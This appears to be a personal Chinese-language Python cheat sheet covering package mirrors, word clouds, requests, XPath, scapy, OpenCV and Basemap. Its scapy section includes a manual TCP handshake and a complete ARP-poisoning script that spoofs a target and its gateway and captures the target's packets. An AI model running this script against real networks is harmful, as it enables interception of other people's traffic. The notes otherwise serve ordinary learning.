Python
==============

修改pip/conda的安装源
::

 conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/
 conda config --set show_channel_urls yes

 新建pip/pip.ini
 [global]
 timeout = 6000
 index-url = https://pypi.tuna.tsinghua.edu.cn/simple
 trusted-host = pypi.tuna.tsinghua.edu.cn


词云
---------------

需要安装jieba、wordcloud
通过命令行直接生成词云的命令行::
 
 wordcloud_cli --text file_path.txt --imagefile wordcloud.png
 # 可以通过wordcloud_cli 进行更详细的调节，需要对文件分词，自带的分词效果较差
 # --fontfile path 支持中文
 # --mask file
 # --background white


通过jieba对中文分词处理::
 
 import jieba
 import wordcloud
 import matplotlib.pyplot as plt

 words = open(r'words.txt','rb').read().decode('utf-8')
 # print(words)
 cut_words = list(jieba.cut(words))
 cut_str = ' '.join(cut_words)
 print(cut_words)
 make = wordcloud.WordCloud(font_path=r'C:\Windows\Fonts\simkai.ttf')
 s = make.generate(cut_str)
 plt.imshow(s)
 plt.axis('off')
 plt.show()

requests
------------------

发送http请求::

 url = 'https://www.baidu.com'
 headers = {'user-agent':""}
 proxy = {"http":"89.17.37.218:52957"} # 使用代理
 response = requests.get(url,params={"wd":"中国"},proxies=proxy)
 # response.content 是原始页面的byte类型，没有解码
 # response.text 是requests 解码后的数据，解码方式是推测的，可能出错

 response = request.post(url,data) # post 请求

urllib 
-----------------------

|    urllib 可以导入request(最为常用)、response、parse

>>> proxy = request.ProxyHandler({"http":"192.122.132.1"})
    opener = request.build_opener(proxy)
    opener.open(url)
 
lxml(XPath)
-------------------

::

 //div  任意位置div

 /div   根节点查找

 *      匹配任意节点

 @*     匹配任意属性

 @      匹配某一属性  

 1. //input[@id="str"] 精确匹配
 2. //input[@class,"f"] 模糊匹配

在python中的导入

>>> from lxml import html
html.etree.parse() # 传入文件地址
html.etree.fromstring() # 传入字符串






scapy
-------------------------
模拟三次握手::
 
 windows查看端口 netstat
 
 send(),在第三层发送数据包，但没有接收功能
 sendp(),在第二层发送数据包，同样没有接收功能

 sr(),在第三层发送数据包，有接收功能
 sr1(),在第三层发送数据包，有接收功能，但只接收第一个包
 srloop(),在第三层工作,循环发包

 srp()、srp1()、srploop()与sr,sr1,srloop类似,只是工作在第二层
 开始模拟时需要设置防火墙规则，防止操作系统发送RST
 iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 192.168.233.1 -j DROP
 
 flags = 2 为SYN扫描，半开式扫描
 recv=sr1(IP(dst="192.168.233.1")/TCP(dport=10020,sport=7777,flags="S"))
 ack = recv.ack
 seq = recv.seq
 
 发送ACK(flag = 16),完成三次握手！
 send(IP(dst='192.168.233.1')/TCP(dport=10020,sport=7777,flags=16,seq=ack,ack=seq+1))

 flag为24（ACK = 16，PUSH = 8) 发送数据
 recv1 = sr(IP(dst='192.168.233.1')/TCP(dport=10020,sport=7777,flags=24,seq=ack,ack=seq+1)/"hi", multi=1, timeout=10)
 如果多次发送数据需要每次对获取的seq+1,然后令ack等于seq+1

 flags=17, FIN（1） + ACK（16），进行连接终结
 recv1=srp1(IP(dst='192.168.233.1')/TCP(dport=10020,sport=7777,seq=ack,ack=seq+1,flags=17))

arp投毒,抓包::

 from scapy.all import *
 import os
 import sys
 import threading
 import signal
 from scapy.layers.l2 import ARP, Ether

 def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
    print("restore target >>>>>>>")
    send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
    send(ARP(op=2,psrc=target_ip,pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
    os.kill(os.getpid(),signal.SIGINT)
 def get_mac(ip_address):
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),
                               timeout=2,retry=10)
    a = 1
    for s,r in responses:
        print(s)
        print("$"*20)
        print(r)
        return r[Ether].src
 def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
    print("begin to ARP poison")
    while True:
        try:
            send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst=target_mac)) # 欺骗主机
            send(ARP(op=2,psrc=target_ip,pdst=gateway_ip,hwdst=gateway_mac)) # 欺骗网关
        except KeyboardInterrupt:
            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

    # print("stoped poison")
 if __name__ == '__main__':

    target_ip = '192.168.0.150'
    gateway_ip = '192.168.0.1'
    packet_count = 10
    conf.verb = 0
    gateway_mac = get_mac(gateway_ip)
    target_mac = get_mac(target_ip)
    print(gateway_mac,target_mac)
    poison_thread = threading.Thread(target=poison_target,args=(gateway_ip,gateway_mac,
                                                                target_ip,target_mac))
    poison_thread.start()
    try:
        bpf_filter = "ip host %s"%target_ip
        packets_ = sniff(count=packet_count,filter=bpf_filter) # 抓包
        wrpcap("arp.pcap",packets_)
        restore_target(gateway_ip,gateway_mac,target_ip,target_mac) # 恢复原先设置
    except KeyboardInterrupt:
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac) # 恢复原先设置

    poison_thread.join()

opencv
---------------------
opencv 安装

1. pip install opencv-python==3.4.2.16

2. pip install opencv-contrib-python==3.4.2.16

::
 
 # 读取图片
 cv2.imread(img_path)
 # 读取影像
 video = cv2.VideoCapture(0) # 0 读取本地摄像头
 ret,frame = video.read() # frame 是每一帧,ret 是读取成功与否标志
 cv2.waitKey(10) # 每帧的间隔时间为10 0xFF==27(Esc键)
 
 # 基本操作
 b,g,r = cv2.split(img) # 拆分通道
 cv2.merge((b,g,r)) # 合并通道
 img = cv2.copyMakeBorder(img,20,20,10,10,cv2.BORDER_REFLECT) # 边界填充
 img = cv2.resize(img,(0,0),fx=0.5,fy=0.5) # 重新调整大小
 img = cv2.addWeighted(img,0.5,img,0.6,0) # 图像按权重融合

 # 阈值操作
 ret,img = cv2.threshold(img,127,255,cv2.THRESH_BINARY) 
 
 # 图像平滑
 img = cv2.blur(img,(3,3),borderType=cv2.BORDER_REFLECT) # 均值滤波
 img = cv2.boxFilter(img,-1,(3,3),normalize=True) # 方框滤波 不标准化越界后赋值为255
 img = cv2.medianBlur(img,3) # 中值滤波
 img = cv2.GaussianBlur(img,(3,3),1) # 权重处理
 
 # 形态学操作
 img = cv2.erode(img,np.ones((5,5),dtype=np.uint8),iterations=1) # 腐蚀最大值,针对最大值
 img = cv2.dilate(img,np.ones((5,5),dtype=np.uint8),iterations=1) # 膨胀
 img = cv2.morphologyEx(img,cv2.MORPH_OPEN,np.ones((5,5),dtype=np.uint8)) # 先腐蚀再膨胀
 img = cv2.morphologyEx(img,cv2.MORPH_CLOSE,np.ones((5,5),dtype=np.uint8)) # 先膨胀再腐蚀
 img = cv2.morphologyEx(img,cv2.MORPH_GRADIENT,kernel) # 梯度 膨胀-腐蚀
 # 礼帽=原始输入-开运算结果; 黑帽=闭运算-原始输入

 # 梯度
 img = cv2.Sobel(img,-1,dx=1,dy=1,ksize=3) # sober算子
 img = cv2.Scharr(img,cv2.CV_64F,dx=0,dy=1) # 细节更为丰富
 img = cv2.Laplacian(img,-1,ksize=3) # 对噪音敏感

 # 边缘检测
 # canny 1.高斯滤波 2.梯度(sober) 3.非极大值抑制 4.双阈值检测
 img = cv2.Canny(img,100,120) # 双阈值: minvalue 100,maxvalue 120

 # 高斯金字塔
 img = cv2.pyrUp(img) # 上采样
 img = cv2.pyrDown(img) # 下采样

 # 图像轮廓
 img,contours,hierarchy = cv2.findContours(img,cv2.RETR_TREE,cv2.CHAIN_APPROX_SIMPLE)
 res = cv2.drawContours(img,contours,-1,(0,255,0),1) # 绘制轮廓
 area = cv2.contourArea(contours[0]) # 计算轮廓面积
 arcLen = cv2.arcLength(contours[0],True) # 计算周长
 res = cv2.approxPolyDP(contours[0],0.1*cv2.arcLength(contours[0],True),True) # 近似周长(点)
 x, y, w, h = cv2.boundingRect(contours[0]) # 外界矩形
 rec = cv2.rectangle(img,(x,y),(x+w,y+h),(0,255,0)) # 绘制矩形

 # 直方图
 res = cv2.calcHist([img],[0],None,[256],[0,256]) # 计算直方图
 mask[50:150,50:150] = 255 # 制作mask

 # SIFT
 cv2.xfeature2d.SIFT_create() # 构建sift
 kp = sift.detect(gray,None) # 检测
 img = cv2.drawKeypoints(gray,kp,img)
 kp,des = sift.compute(gray,kp) # 128维向量

 # 特征匹配
 bf = cv2.BFMatcher(crossCheck=True) # 蛮力匹配
 bf.match()

 # 背景建模
 # 1. 帧差法
 # 2. 混合高斯模型(GMM)

basemap
------------------
::

 projection
 # Albers Equal Area Projection
 # lat_1 is first standard parallel.
 # lat_2 is second standard parallel.
 # lon_0,lat_0 is central point
 m = Basemap(width=8000000,height=7000000, resolution='l',projection='aea', lat_1=40.,lat_2=60,lon_0=35,lat_0=50)
 m.drawcoastlines() # 海岸线
 m.drawcountries() # 国家界限
 m.drawparallels(np.arange(-80.,81.,20.)) # 纬线
 m.drawmeridians(np.arange(-180.,181.,20.)) # 经线
 m.drawgreatcircle(90,35,100,50,color="r") # 连接线
 m.bluemarble() # draw a NASA Blue Marble image as a map background.卫星背景
 m.shadedrelief() # draw a shaded relief image as a map background,阴影背景
 m.etopo() # 浮雕(背景)
 m.quiver(90,45,1,5,color='g') # 添加矢量箭头